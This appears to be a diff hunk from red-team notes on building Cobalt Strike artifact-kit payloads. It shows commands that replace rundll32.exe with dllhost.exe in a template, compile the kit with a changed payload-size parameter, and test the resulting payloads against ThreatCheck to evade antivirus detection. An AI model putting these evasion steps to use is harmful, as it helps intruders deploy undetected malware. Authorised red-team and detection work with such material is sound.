@@ -290,7 +290,7 @@ http-stager {
 PS > $template_path="C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\script_template.cna" ; (Get-Content -Path $template_path)  -replace 'rundll32.exe' ,  'dllhost.exe' | Set-Content -Path $template_path
 # Compile the Artifact kit (From WSL in Attacker windows Machine)
 $ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
-$ ./build.sh pipe VirtualAlloc 296948 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
+$ ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
 # Other Techniques are : mailslot, peek , pipe, readfile, readfile-v2
 # Now load the artifact kit in cobalt strike (Cobalt Strike > Script Manager > Load)
 # Now generate the payloads and test if these are getting detected, if they are detected by ThreatCheck , Follow the notes to modify the artifact kit code.
